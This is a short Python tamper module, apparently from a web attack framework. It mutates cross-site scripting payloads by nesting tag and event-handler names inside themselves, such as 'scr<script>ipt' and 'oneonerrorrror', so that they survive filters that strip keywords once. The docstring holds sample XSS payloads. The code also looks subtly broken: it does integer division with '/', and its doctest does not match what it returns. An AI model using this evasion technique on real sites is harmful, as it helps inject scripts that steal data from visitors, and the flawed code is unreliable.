# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY, TYPE
__priority__ = PRIORITY.LOWEST
__classificationtype__ = TYPE.BackEND_SPECIFIED




def tamper(payload, **kwargs):
    """
    >>> tamper("<script src=# onerror=alert(1)>")
    <img src=x oneonerrorrror=alert(1);>
    <scr<script>ipt>alert('XSS')</scr<script>ipt>
    """
    result=[]
    string=re.sub(r"(?<=[<\s])[\w]*(?=[>=:])",convert_this,str(payload))
    if string!=payload:
        result.append(string)
    string=re.sub(r"(?<=[=:])[\w]*(?=[;\s():])",convert_this,str(string))
    if string!=payload:
        result.append(string)

    return (result) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    length=len(string)
    if length>1:
        string=string[:length/2]+string+string[length/2:]
    return string
